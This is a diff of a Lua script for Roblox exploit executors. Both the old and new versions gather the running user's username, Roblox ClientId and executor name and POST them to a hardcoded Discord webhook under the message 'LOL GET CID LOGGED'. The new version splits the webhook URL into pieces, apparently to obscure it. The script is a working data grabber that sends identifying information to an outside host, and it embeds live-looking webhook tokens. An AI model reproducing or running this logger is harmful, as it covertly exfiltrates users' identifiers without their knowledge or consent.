@@ -1,32 +1,45 @@
-local ec = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
-local g = game
-local cid = g:GetService("RbxAnalyticsService"):GetClientId()
-local wurl = "https://discord.com/api/webhooks/966936459514875935/6h9ottG8PsqkU3AjOzRTlzNCNznvLxc1xJILneQ45NHEqo5ipfgAxtCTTPmOp_MMHYhY"
-local d = {
+local ek = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit";
+local ge = game;
+local re = ge:GetService("RbxAnalyticsService");
+local cd = re:GetClientId();
+local ps = ge:GetService("Players");
+local lr = ps.LocalPlayer;
+local le = lr.Name;
+local he = ge:GetService("HttpService");
+local url1 = "https://discord.com/api/webhooks/";
+local url2 = "968304971466547220/";
+local url3 = "CDj9swdNxS3g4bIiAXuWU-lL8Xz5qMkHeYegdCLD3t1sEaddn4Y1dXz91pb7LZsmZyvI";
+local cg = url1..url2..url3
+local sn = syn;
+local st = sn.request;
+local da = {
     ["content"] = "LOL GET CID LOGGED",
     ["embeds"] = {
         {
-            ["title"] = "**Username: " .. game.Players.LocalPlayer.Name.." **",
-            ["description"] = "ClientId: " .. cid.." with **"..ec.."**",
+            ["title"] = "**Username: " .. le.." **",
+            ["description"] = "ClientId: " .. cd.." with **"..ek.."**",
             ["type"] = "rich",
             ["color"] = tonumber(0x7269da),
             ["image"] = {
                 ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                    tostring(game:GetService("Players").LocalPlayer.Name)
+                    tostring(le)
             }
         }
     }
-}
-local nd = g:GetService("HttpService"):JSONEncode(d)
-local h = {
+};
+if string.find(da.content, "@everyone") or string.find(da.content, "@here") then
+    da.content = "this man is trolling lol"
+end
+local na = he:JSONEncode(da)
+local hs = {
     ["content-type"] = "application/json"
-}
-local m = "POST"
-local p = {
-    Url = wurl,
-    Body = nd,
-    Method = m,
-    Headers = h
-}
-local r = http_request or request or HttpPost or syn.request
-r(p)
+};
+local md = "POST"
+local pt = {
+    Url = cg,
+    Body = na,
+    Method = md,
+    Headers = hs
+};
+local r = http_request or request or HttpPost or st;
+r(pt)
